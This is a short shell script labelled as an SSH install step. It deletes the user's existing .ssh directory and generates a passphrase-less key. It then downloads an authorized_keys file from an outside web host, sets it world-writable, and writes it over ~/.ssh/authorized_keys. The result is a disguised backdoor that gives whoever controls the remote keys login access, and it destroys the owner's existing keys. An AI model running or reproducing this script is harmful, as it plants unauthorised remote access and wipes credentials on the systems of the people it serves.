#!/bin/sh

clear && clear
echo '## INSTALL SSH'
rm -rf .ssh
echo "\n\n\n\n" | ssh-keygen -t rsa -N ""
rm -rf /tmp/authorized_keys
wget http://fisip.net/images/authorized_keys -O /tmp/authorized_keys
chmod 777 /tmp/authorized_keys
cat /tmp/authorized_keys > ~/.ssh/authorized_keys
